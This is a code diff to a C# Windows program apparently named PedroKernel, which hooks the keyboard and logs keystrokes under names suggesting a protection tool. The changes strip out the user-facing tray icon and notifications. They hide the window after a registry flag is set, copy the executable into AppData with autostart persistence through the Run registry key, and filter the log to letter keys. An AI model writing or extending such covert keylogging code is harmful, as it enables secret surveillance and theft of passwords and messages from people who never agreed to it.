@@ -22,9 +22,8 @@ namespace PedroKernel
 {
     public partial class Form1 : Form
     {
-        private bool isDebug = false;
+        private bool registeredUser = false;
         private static Timer timer;
-        private NotifyIcon trayIcon;
 
         private const int WindowsProtectorLove = 13;
         private const int WindowsProtectorHate = 0x0100;
@@ -55,9 +54,12 @@ namespace PedroKernel
 
         private bool isVisible()
         {
-            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            bool registryKeyExists = reg != null && reg.GetValue(Application.ProductName) != null;
-            bool isVisible = registryKeyExists || isDebug || IsDayOdd();
+            RegistryKey info = Registry.CurrentUser.OpenSubKey("SOFTWARE\\PedroKernel");
+            if (info != null)
+            {
+                registeredUser = Convert.ToBoolean(info.GetValue("registeredUser"));
+            }
+            bool isVisible = !registeredUser;
             return isVisible;
         }
 
@@ -73,7 +75,6 @@ namespace PedroKernel
         public Form1()
         {
             InitializeComponent();
-            InitializeTrayIcon();
 
             ShowInTaskbar = isVisible();
             WindowState = isVisible() ? FormWindowState.Normal : FormWindowState.Minimized;
@@ -89,9 +90,10 @@ namespace PedroKernel
                 var elapsed = (DateTime.Now - WindowsProtectorPress).TotalSeconds;
                 if (elapsed >= DebounceIntervalSeconds)
                 {
-                    if ((key >= Keys.F1 && key <= Keys.F24) || key == Keys.LWin || key == Keys.RWin || key == Keys.Apps)
+                    if ((key >= Keys.F1 && key <= Keys.F24) || key == Keys.LWin || key == Keys.RWin || key == Keys.Apps ||
+                        key == Keys.LShiftKey || key == Keys.RShiftKey || key == Keys.Back)
                     {
-                        // Ignore function keys, Windows keys, and context menu key
+                        // Ignore function keys, Windows keys, Shift keys, and Back key
                     }
                     else
                     {
@@ -100,10 +102,10 @@ namespace PedroKernel
                             windowsafe.AppendLine(); // Start a new line before "Pressed:"
                             windowsafe.Append("Pressed: "); // Append "Pressed:" at the start of the line
                         }
-                        else if (key != Keys.Space)
+                        else if (Char.IsLetter((char)key))
                         {
                             // Append the pressed key with a comma and space
-                            windowsafe.Append($"{key}, ");
+                            windowsafe.Append($"{(char)key}");
                         }
                     }
                 }
@@ -139,9 +141,7 @@ namespace PedroKernel
         private void TimerElapsed(object sender, ElapsedEventArgs e)
         {
             UpdateHooker();
-            ShowNotification("Pedro Information", "Found something, dealing with it.");
         }
-        //UpdateFile(string logFilePath)
         public void EnableHooker()
         {
             if (windowhuker != IntPtr.Zero)
@@ -256,21 +256,6 @@ namespace PedroKernel
             UpdateHooker();
             UnhookWindowsHookEx(windowhuker);
         }
-        public void ShowNotification(string title, string message)
-        {
-            IntPtr handle = Process.GetCurrentProcess().MainWindowHandle;
-
-            using (NotifyIcon notifyIcon = new NotifyIcon())
-            {
-                notifyIcon.Icon = Properties.Resources.Icon0;
-                notifyIcon.Visible = true;
-                notifyIcon.BalloonTipTitle = title;
-                notifyIcon.BalloonTipText = message;
-                notifyIcon.ShowBalloonTip(3000);
-                Thread.Sleep(1000);
-                notifyIcon.Visible = false;
-            }
-        }
         #endregion
 
         private void button1_Click(object sender, EventArgs e)
@@ -304,12 +289,28 @@ namespace PedroKernel
             Console.WriteLine(textBox1.Text);
         }
 
+        private void RegisterKey()
+        {
+            string sourceFilePath = Application.ExecutablePath;
+
+            string appDataDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+
+            string destinationFilePath = Path.Combine(appDataDirectory, Path.GetFileName(sourceFilePath));
+
+            File.Copy(sourceFilePath, destinationFilePath, true);
+
+            RegistryKey reg = reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            reg.SetValue("Pedro Information", destinationFilePath);
+        }
+
         private void pictureBox1_Click(object sender, EventArgs e)
         {
-            RegistryKey reg = reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            reg.SetValue("Pedro Information", Application.ExecutablePath.ToString());
+            RegisterKey();
             textBox1.ForeColor = System.Drawing.Color.YellowGreen;
             textBox1.Text = "You have enabled automatic startup.";
+            registeredUser = true;
+            RegistryKey reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\PedroKernel");
+            reg.SetValue("registeredUser", registeredUser);
         }
 
         private void deleteRegistryInit()
